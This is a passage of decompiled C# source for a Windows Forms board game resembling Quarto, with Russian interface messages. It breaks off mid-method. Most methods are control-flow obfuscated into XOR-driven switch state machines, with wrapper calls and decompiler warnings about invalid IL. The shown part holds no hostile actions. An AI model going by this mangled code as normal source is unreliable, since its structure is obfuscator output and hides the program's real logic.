using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 892926111;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x79EE032Cu) % 6u)
					{
					case 5u:
						Dark = dark;
						Big = big;
						num = (int)((num2 * 1510472754) ^ 0x330B670);
						continue;
					case 3u:
						num = ((int)num2 * -162667165) ^ -2003621850;
						continue;
					case 1u:
						num = (int)(num2 * 568116672) ^ -1629451179;
						continue;
					case 0u:
						Square = square;
						Point = point;
						num = ((int)num2 * -2061427855) ^ 0x613810AC;
						continue;
					default:
						return;
					case 4u:
						break;
					case 2u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_010d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Expected O, but got Unknown
		int num3 = default(int);
		int num6 = default(int);
		double num5 = default(double);
		while (true)
		{
			int num = 1903497616;
			while (true)
			{
				uint num2;
				double num4;
				switch ((num2 = (uint)num ^ 0x70D2F35Cu) % 21u)
				{
				case 20u:
					pictureBox = new PictureBox[4, 4];
					borderBox = new PictureBox[4, 4];
					num = ((int)num2 * -1109410845) ^ 0x65F4DA81;
					continue;
				case 19u:
					num = 1746639595;
					continue;
				case 17u:
					num = ((int)num2 * -1044851775) ^ 0x18D70578;
					continue;
				case 16u:
					num3 = 0;
					num = 1986996724;
					continue;
				case 15u:
					num4 = 4.1;
					goto IL_0084;
				case 14u:
					num6 = 0;
					num = (int)(num2 * 858798553) ^ -1444804714;
					continue;
				case 13u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -813109601) ^ -270893163;
					continue;
				}
				case 12u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num6, num3]);
					num = ((int)num2 * -969034930) ^ -2033473870;
					continue;
				case 11u:
				{
					Form1.smethod_6((Control)(object)pictureBox[num6, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					PictureBox[,] array2 = borderBox;
					int num11 = num6;
					int num12 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num3 + num5) * (double)size), 1 + num6 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num11, num12] = obj2;
					num = ((int)num2 * -724130035) ^ -1103324175;
					continue;
				}
				case 10u:
					num3++;
					num = ((int)num2 * -823637677) ^ -1787585527;
					continue;
				case 9u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)(num2 * 437651549) ^ -274725995;
					continue;
				case 8u:
				{
					int num10;
					if (num6 >= 4)
					{
						num = 448833006;
						num10 = 448833006;
					}
					else
					{
						num = 1326307145;
						num10 = 1326307145;
					}
					continue;
				}
				case 7u:
				{
					int num9;
					if (num3 < 4)
					{
						num = 1734630307;
						num9 = 1734630307;
					}
					else
					{
						num = 1118379327;
						num9 = 1118379327;
					}
					continue;
				}
				case 6u:
				{
					PictureBox[,] array = pictureBox;
					int num7 = num6;
					int num8 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num3 + num5) * (double)size), 4 + num6 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num7, num8] = obj;
					num = (int)(num2 * 538458458) ^ -678627715;
					continue;
				}
				case 4u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num6, num3]);
					num = (int)((num2 * 860363514) ^ 0x33D68C17);
					continue;
				case 3u:
					num6++;
					num = (int)((num2 * 1675867082) ^ 0x78374723);
					continue;
				case 2u:
					num = (int)((num2 * 8838213) ^ 0x20EB384);
					continue;
				case 1u:
					InitializeComponent();
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = (int)(num2 * 1484096884) ^ -907131322;
					continue;
				case 0u:
					if (num3 >= 2)
					{
						num = (int)(num2 * 303830241) ^ -1050966048;
						continue;
					}
					num4 = 0.0;
					goto IL_0084;
				default:
					return;
				case 18u:
					break;
				case 5u:
					return;
					IL_0084:
					num5 = num4;
					num = 1672016641;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 662530850;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x60EBA34Du) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -103383638) ^ -1775028654;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1062533698;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3DB6FF6Cu) % 11u)
				{
				case 10u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -1030288320) ^ 0x158DE80B;
					continue;
				case 9u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 558629471;
						num4 = 558629471;
					}
					else
					{
						num3 = 1185988192;
						num4 = 1185988192;
					}
					num = num3 ^ (int)(num2 * 1669009830);
					continue;
				}
				case 7u:
					num = ((int)num2 * -2015405209) ^ 0x26A57B02;
					continue;
				case 6u:
					num = ((int)num2 * -1586276006) ^ -1980361342;
					continue;
				case 5u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 2016503519;
					continue;
				case 4u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1410988142) ^ 0x67347D3A;
					continue;
				case 3u:
					num = ((int)num2 * -2125035934) ^ 0x5FBCD073;
					continue;
				case 2u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 1178028351;
					continue;
				}
				case 1u:
					num = (int)(num2 * 1742202287) ^ -335061348;
					continue;
				default:
					return;
				case 0u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1425600907;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9FEF6645u) % 21u)
				{
				case 20u:
					num = ((int)num2 * -1564617923) ^ 0x1773FA80;
					continue;
				case 19u:
					num3++;
					num = (int)((num2 * 2112705363) ^ 0x5026AF8E);
					continue;
				case 17u:
					num = (int)((num2 * 654839943) ^ 0x35447C42);
					continue;
				case 16u:
					Paint_Board();
					num = (int)(num2 * 473829236) ^ -361294984;
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1272914900) ^ -1837379041;
					continue;
				case 14u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					num = ((int)num2 * -1570997380) ^ 0x5C93E705;
					continue;
				case 12u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -207848384) ^ -215830474;
					continue;
				case 11u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = -446989959;
						num7 = -446989959;
					}
					else
					{
						num6 = -326155362;
						num7 = -326155362;
					}
					num = num6 ^ (int)(num2 * 60907345);
					continue;
				}
				case 10u:
					num3 = 0;
					num = (int)((num2 * 1209918395) ^ 0x6B1C121E);
					continue;
				case 9u:
					num4++;
					num = (int)((num2 * 9452900) ^ 0x369815AE);
					continue;
				case 8u:
					num = -682563696;
					continue;
				case 7u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num = (int)(num2 * 957322685) ^ -2067955049;
					continue;
				case 6u:
					num4 = 0;
					num = -1373102407;
					continue;
				case 5u:
					flag = num4 < 4;
					num = -1822529861;
					continue;
				case 4u:
				{
					int num5;
					if (num3 < 4)
					{
						num = -33752608;
						num5 = -33752608;
					}
					else
					{
						num = -735789491;
						num5 = -735789491;
					}
					continue;
				}
				case 3u:
					num = ((int)num2 * -824666193) ^ 0x61C2D272;
					continue;
				case 2u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = (int)((num2 * 1389977210) ^ 0x5E28C999);
					continue;
				case 1u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1373518014) ^ 0x241034DF);
					continue;
				case 0u:
					Paint_Storage();
					num = ((int)num2 * -804460527) ^ 0x16EC5D05;
					continue;
				default:
					return;
				case 13u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Graphics graphics_ = default(Graphics);
		int num8 = default(int);
		int num9 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool square = default(bool);
		float num12 = default(float);
		float num13 = default(float);
		Brush brush_ = default(Brush);
		bool big = default(bool);
		float num3 = default(float);
		float num16 = default(float);
		float num17 = default(float);
		bool point = default(bool);
		while (true)
		{
			int num = -1138864423;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC6487C22u) % 39u)
				{
				case 38u:
					num = ((int)num2 * -367276956) ^ -822650485;
					continue;
				case 37u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -974929799) ^ -1788263887;
					continue;
				case 36u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num8 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					flag = board[num9, num8] != null;
					num = (int)((num2 * 207200366) ^ 0x569CF467);
					continue;
				case 35u:
					flag2 = num9 < 4;
					num = -1065948458;
					continue;
				case 34u:
					num = -313018118;
					continue;
				case 33u:
					num = ((int)num2 * -1218518437) ^ -1414207120;
					continue;
				case 32u:
				{
					int num20;
					int num21;
					if (!square)
					{
						num20 = 1215238839;
						num21 = 1215238839;
					}
					else
					{
						num20 = 1024057767;
						num21 = 1024057767;
					}
					num = num20 ^ (int)(num2 * 1039765584);
					continue;
				}
				case 31u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num12 + (float)(num8 * size), num12 + (float)(num9 * size), num13, num13);
					num = ((int)num2 * -1172405264) ^ 0x32964B84;
					continue;
				case 30u:
					brush_ = Form1.smethod_26();
					num = -209493244;
					continue;
				case 29u:
					num9++;
					num = ((int)num2 * -1600761533) ^ 0x38DCA4A7;
					continue;
				case 28u:
					num8 = 0;
					num = -1313747068;
					continue;
				case 27u:
					Form1.smethod_24(graphics_, brush_, num12 + (float)(num8 * size), num12 + (float)(num9 * size), num13, num13);
					num = -1547741729;
					continue;
				case 26u:
				{
					int num6;
					int num7;
					if (!big)
					{
						num6 = -63578556;
						num7 = -63578556;
					}
					else
					{
						num6 = -2147189388;
						num7 = -2147189388;
					}
					num = num6 ^ (int)(num2 * 848375474);
					continue;
				}
				case 25u:
				{
					int num22;
					if (num8 >= 4)
					{
						num = -286842650;
						num22 = -286842650;
					}
					else
					{
						num = -883945394;
						num22 = -883945394;
					}
					continue;
				}
				case 24u:
					num = -1140723687;
					continue;
				case 23u:
					num3 = 0.7f;
					num = -1329914816;
					continue;
				case 22u:
					num8++;
					num = -1453857164;
					continue;
				case 21u:
					num16 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -310367144;
					continue;
				case 20u:
					num13 = num17 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num9, num8].Square;
					num = (int)(num2 * 1741839894) ^ -1323550376;
					continue;
				case 19u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 314552731) ^ 0x4B66A06D);
					continue;
				case 18u:
				{
					int num18;
					int num19;
					if (!flag2)
					{
						num18 = 799400316;
						num19 = 799400316;
					}
					else
					{
						num18 = 436785531;
						num19 = 436785531;
					}
					num = num18 ^ (int)(num2 * 1386047228);
					continue;
				}
				case 17u:
					num = ((int)num2 * -941295553) ^ -553393234;
					continue;
				case 16u:
					num12 = (float)size * (num16 / 2f);
					num13 = num17 * 0.4f / (float)Form1.smethod_27(2.0);
					point = board[num9, num8].Point;
					num = ((int)num2 * -705942154) ^ -2076211177;
					continue;
				case 15u:
					num16 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num17 = (float)size * num3;
					num12 = (float)size * (num16 / 2f);
					num = -743198221;
					continue;
				case 14u:
					num = ((int)num2 * -332389061) ^ -1082828340;
					continue;
				case 13u:
					num = (int)((num2 * 564277305) ^ 0x344B5283);
					continue;
				case 12u:
					num = ((int)num2 * -1859513918) ^ -315852285;
					continue;
				case 9u:
					Form1.smethod_28(graphics_, brush_, num12 + (float)(num8 * size), num12 + (float)(num9 * size), num13, num13);
					num = ((int)num2 * -534519105) ^ 0x47BB7004;
					continue;
				case 8u:
					num = (int)((num2 * 973706157) ^ 0x68B4E3CB);
					continue;
				case 7u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1492364542) ^ 0xE5FDAF3);
					continue;
				case 6u:
				{
					int num14;
					int num15;
					if (!board[num9, num8].Dark)
					{
						num14 = -1041385629;
						num15 = -1041385629;
					}
					else
					{
						num14 = -309085819;
						num15 = -309085819;
					}
					num = num14 ^ (int)(num2 * 580361540);
					continue;
				}
				case 5u:
					num9 = 0;
					num = ((int)num2 * -800114391) ^ 0x67229282;
					continue;
				case 4u:
					big = board[num9, num8].Big;
					num = -1613327285;
					continue;
				case 3u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 1369475264;
						num11 = 1369475264;
					}
					else
					{
						num10 = 1625548811;
						num11 = 1625548811;
					}
					num = num10 ^ (int)(num2 * 199939637);
					continue;
				}
				case 2u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1591375911) ^ -283500837;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (point)
					{
						num4 = -367516836;
						num5 = -367516836;
					}
					else
					{
						num4 = -396868693;
						num5 = -396868693;
					}
					num = num4 ^ (int)(num2 * 417630887);
					continue;
				}
				case 0u:
					num3 = 1f;
					num = (int)((num2 * 1082960447) ^ 0x36BEE455);
					continue;
				default:
					return;
				case 11u:
					break;
				case 10u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		float num14 = default(float);
		float num11 = default(float);
		float num13 = default(float);
		float num12 = default(float);
		bool point = default(bool);
		int num5 = default(int);
		bool flag = default(bool);
		float num10 = default(float);
		bool flag2 = default(bool);
		Brush brush_ = default(Brush);
		bool big = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag3 = default(bool);
		while (true)
		{
			int num2;
			int num3;
			if (num < 4)
			{
				num2 = -1232631537;
				num3 = -1232631537;
			}
			else
			{
				num2 = -635475375;
				num3 = -635475375;
			}
			while (true)
			{
				uint num4;
				switch ((num4 = (uint)num2 ^ 0xB6F4FD1Fu) % 38u)
				{
				case 37u:
					num++;
					num2 = (int)((num4 * 1668180248) ^ 0x45ED2427);
					continue;
				case 36u:
					num14 = (float)size * (num11 / 2f) - 4f;
					num2 = (int)(num4 * 1918496612) ^ -945826612;
					continue;
				case 35u:
					num13 = num12 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num, num5].Point;
					num2 = ((int)num4 * -1293856144) ^ -1451714664;
					continue;
				case 33u:
					flag = num5 < 4;
					num2 = -763191347;
					continue;
				case 32u:
					num11 = 1f - num10 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -192056753;
					continue;
				case 31u:
					num5++;
					num2 = -1067511310;
					continue;
				case 30u:
					num2 = (int)((num4 * 54123670) ^ 0xBC185E6);
					continue;
				case 29u:
					num10 = 0.7f;
					num2 = -31159103;
					continue;
				case 28u:
					num11 = 1f - num10 * 0.9f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * num10;
					num2 = -1863383467;
					continue;
				case 27u:
				{
					int num17;
					int num18;
					if (!flag2)
					{
						num17 = 1653366756;
						num18 = 1653366756;
					}
					else
					{
						num17 = 1228026549;
						num18 = 1228026549;
					}
					num2 = num17 ^ (int)(num4 * 1848372467);
					continue;
				}
				case 26u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = 746804106;
						num9 = 746804106;
					}
					else
					{
						num8 = 1580593706;
						num9 = 1580593706;
					}
					num2 = num8 ^ ((int)num4 * -1078494307);
					continue;
				}
				case 25u:
					num13 = num12 * 0.9f / (float)Form1.smethod_27(2.0);
					flag2 = num5 < 2;
					num2 = ((int)num4 * -1020986329) ^ 0x678DE89D;
					continue;
				case 23u:
					num2 = ((int)num4 * -1838968506) ^ -1071394609;
					continue;
				case 22u:
					num2 = -1232631537;
					continue;
				case 21u:
					Form1.smethod_30((Control)(object)pictureBox[num, num5]);
					num2 = -1553658592;
					continue;
				case 20u:
					num5 = 0;
					num2 = -1015965788;
					continue;
				case 19u:
					num2 = ((int)num4 * -872668933) ^ -2069154694;
					continue;
				case 18u:
					brush_ = Form1.smethod_26();
					num2 = -1100571967;
					continue;
				case 17u:
					num2 = ((int)num4 * -1318850075) ^ -137569527;
					continue;
				case 16u:
					big = storage[num, num5].Big;
					num2 = -208693891;
					continue;
				case 15u:
					num2 = (int)((num4 * 723953005) ^ 0x1791B86E);
					continue;
				case 14u:
					Form1.smethod_20(pictureBox[num, num5], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num5]), Form1.smethod_16((Control)(object)pictureBox[num, num5])));
					num2 = (int)(num4 * 519500855) ^ -130639682;
					continue;
				case 13u:
					Form1.smethod_28(graphics_, brush_, num14, num14, num13, num13);
					num2 = ((int)num4 * -1994484249) ^ 0x43D68472;
					continue;
				case 12u:
					brush_ = Form1.smethod_25();
					num2 = (int)(num4 * 1389749377) ^ -5446660;
					continue;
				case 11u:
				{
					int num21;
					int num22;
					if (!point)
					{
						num21 = 1668833019;
						num22 = 1668833019;
					}
					else
					{
						num21 = 730821375;
						num22 = 730821375;
					}
					num2 = num21 ^ (int)(num4 * 1840699979);
					continue;
				}
				case 10u:
					num2 = ((int)num4 * -283018848) ^ -1226034677;
					continue;
				case 9u:
					flag3 = storage[num, num5] != null;
					num2 = -1050410331;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, brush_, num14, num14, num13, num13);
					num2 = -64571938;
					continue;
				case 7u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num14, num14, num13, num13);
					num2 = (int)(num4 * 1696186029) ^ -13246714;
					continue;
				case 6u:
				{
					int num19;
					int num20;
					if (flag3)
					{
						num19 = -324206085;
						num20 = -324206085;
					}
					else
					{
						num19 = -821434742;
						num20 = -821434742;
					}
					num2 = num19 ^ ((int)num4 * -1828406692);
					continue;
				}
				case 5u:
					num10 = 1f;
					num2 = (int)(num4 * 1309271191) ^ -2077078905;
					continue;
				case 4u:
				{
					int num15;
					int num16;
					if (!big)
					{
						num15 = 2018592294;
						num16 = 2018592294;
					}
					else
					{
						num15 = 732696860;
						num16 = 732696860;
					}
					num2 = num15 ^ (int)(num4 * 1272198886);
					continue;
				}
				case 3u:
					num2 = (int)(num4 * 1486444248) ^ -865022406;
					continue;
				case 2u:
					num14 = (float)size * (num11 / 2f) - 4f;
					num2 = ((int)num4 * -2095765582) ^ -55191530;
					continue;
				case 1u:
					num2 = ((int)num4 * -591974951) ^ -455611258;
					continue;
				case 0u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num5]));
					int num6;
					int num7;
					if (storage[num, num5].Dark)
					{
						num6 = 1931632977;
						num7 = 1931632977;
					}
					else
					{
						num6 = 740505071;
						num7 = 740505071;
					}
					num2 = num6 ^ ((int)num4 * -507442168);
					continue;
				}
				default:
					return;
				case 34u:
					break;
				case 24u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num3 = default(int);
		int num4 = default(int);
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 1843059634;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x33468BABu) % 31u)
				{
				case 30u:
					num3 = 0;
					num = (int)(num2 * 154575215) ^ -958643962;
					continue;
				case 29u:
					num3++;
					num = (int)(num2 * 1400879598) ^ -1881488226;
					continue;
				case 28u:
					num = ((int)num2 * -1893857724) ^ 0x481C19BA;
					continue;
				case 27u:
					step = 0;
					num = (int)(num2 * 1471964344) ^ -1569538609;
					continue;
				case 26u:
					num = ((int)num2 * -1819151740) ^ -507742367;
					continue;
				case 25u:
					num4++;
					num = (int)(num2 * 2019065499) ^ -1102330345;
					continue;
				case 24u:
					num6 = Form1.smethod_33(rnd, 4);
					num = 910888181;
					continue;
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 580362178;
					continue;
				case 22u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 399596289;
						num11 = 399596289;
					}
					else
					{
						num10 = 68702894;
						num11 = 68702894;
					}
					num = num10 ^ (int)(num2 * 1594813157);
					continue;
				}
				case 21u:
					num = ((int)num2 * -430264815) ^ 0x412F888A;
					continue;
				case 20u:
					num = ((int)num2 * -1224045392) ^ 0x3F5F4394;
					continue;
				case 19u:
					num = ((int)num2 * -1727131010) ^ 0x6E35D7EA;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -2044205783) ^ 0x3BD0D4E;
					continue;
				case 16u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 609945933) ^ -623880849;
					continue;
				case 15u:
					num = ((int)num2 * -1160551783) ^ -209052359;
					continue;
				case 14u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 722465083) ^ 0x475063D);
					continue;
				case 12u:
				{
					int num8;
					int num9;
					if (flag)
					{
						num8 = 613191381;
						num9 = 613191381;
					}
					else
					{
						num8 = 826321989;
						num9 = 826321989;
					}
					num = num8 ^ (int)(num2 * 2100548348);
					continue;
				}
				case 11u:
				{
					int num7;
					if (num4 >= 4)
					{
						num = 1994267876;
						num7 = 1994267876;
					}
					else
					{
						num = 150548473;
						num7 = 150548473;
					}
					continue;
				}
				case 10u:
					num = ((int)num2 * -2135420587) ^ 0x275E754D;
					continue;
				case 9u:
				{
					int num5 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num6, num5], Color.Blue);
					num = (int)((num2 * 1772161328) ^ 0x781B2617);
					continue;
				}
				case 8u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 613658070;
					continue;
				case 7u:
					num4 = 0;
					num = 1187415176;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 953754481) ^ -1735657113;
					continue;
				case 5u:
					flag2 = num3 < 4;
					num = 1857278456;
					continue;
				case 4u:
					flag = turn;
					num = (int)(num2 * 1876912382) ^ -462474541;
					continue;
				case 3u:
					num = (int)((num2 * 382873474) ^ 0x453833DD);
					continue;
				case 2u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 1431004161) ^ -1710012006;
					continue;
				case 1u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -208608116) ^ -1394527349;
					continue;
				case 0u:
					step = 1;
					num = (int)((num2 * 1025572921) ^ 0xF267244);
					continue;
				default:
					return;
				case 13u:
					break;
				case 17u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		while (true)
		{
			int num = 110393209;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2721145Au) % 4u)
				{
				case 3u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 660207330) ^ -1311914655;
					continue;
				case 1u:
					num = (int)((num2 * 1598142492) ^ 0x2705CE58);
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Expected O, but got Unknown
		int num7 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		Point point = default(Point);
		int num4 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -413614353;
			while (true)
			{
				uint num2;
				int num14;
				switch ((num2 = (uint)num ^ 0xA9D3DFF6u) % 28u)
				{
				case 27u:
					if (storage[num7, num3] != null)
					{
						num = -762854516;
						continue;
					}
					num14 = 0;
					goto IL_0020;
				case 26u:
					num5 = 0;
					num = -91721818;
					continue;
				case 24u:
					num3 -= 4;
					num = (int)((num2 * 666251354) ^ 0x31C9FF9);
					continue;
				case 23u:
					num7 = point.Y / size;
					num = ((int)num2 * -826886722) ^ -113168415;
					continue;
				case 22u:
					num = ((int)num2 * -238757378) ^ 0x66DFAC97;
					continue;
				case 21u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -2116418879) ^ -1711540300;
					continue;
				case 20u:
					num = ((int)num2 * -223418131) ^ 0x589324BE;
					continue;
				case 19u:
					num = ((int)num2 * -707959877) ^ -340493399;
					continue;
				case 17u:
					num = (int)(num2 * 1040921397) ^ -1948714179;
					continue;
				case 16u:
					Form1.smethod_5((Control)(object)borderBox[num7, num3], Color.Red);
					num = ((int)num2 * -1732502457) ^ 0xC325BA6;
					continue;
				case 15u:
					num4++;
					num = (int)((num2 * 1790373610) ^ 0x3FE57E3E);
					continue;
				case 14u:
					num14 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num7, num3]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0020;
				case 13u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 447339339) ^ 0xC489ADE);
					continue;
				case 12u:
					num = (int)((num2 * 611804273) ^ 0x1CC2369);
					continue;
				case 11u:
					num3 = point.X / size;
					num = ((int)num2 * -1822745294) ^ -2021260580;
					continue;
				case 10u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = 1235399857;
						num13 = 1235399857;
					}
					else
					{
						num12 = 127643737;
						num13 = 127643737;
					}
					num = num12 ^ ((int)num2 * -593627013);
					continue;
				}
				case 9u:
					num4 = 0;
					num = (int)(num2 * 928733633) ^ -56730163;
					continue;
				case 8u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = -504098702;
						num11 = -504098702;
					}
					else
					{
						num10 = -1687166496;
						num11 = -1687166496;
					}
					num = num10 ^ ((int)num2 * -62713930);
					continue;
				}
				case 7u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = 593511302;
						num9 = 593511302;
					}
					else
					{
						num8 = 476360213;
						num9 = 476360213;
					}
					num = num8 ^ (int)(num2 * 545289685);
					continue;
				}
				case 6u:
					num5++;
					num = ((int)num2 * -559261299) ^ -641916552;
					continue;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.White);
					num = -290899065;
					continue;
				case 4u:
				{
					int num6;
					if (num5 < 4)
					{
						num = -843094725;
						num6 = -843094725;
					}
					else
					{
						num = -867188615;
						num6 = -867188615;
					}
					continue;
				}
				case 3u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1645335699) ^ 0x76BD676C;
					continue;
				case 2u:
					flag2 = num4 < 4;
					num = -609087218;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 102910602) ^ -1258935861;
					continue;
				case 0u:
					flag = num3 > 1;
					num = (int)(num2 * 200496644) ^ -1915383683;
					continue;
				default:
					return;
				case 18u:
					break;
				case 25u:
					return;
					IL_0020:
					flag3 = (byte)num14 != 0;
					num = -435076696;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		int num6 = default(int);
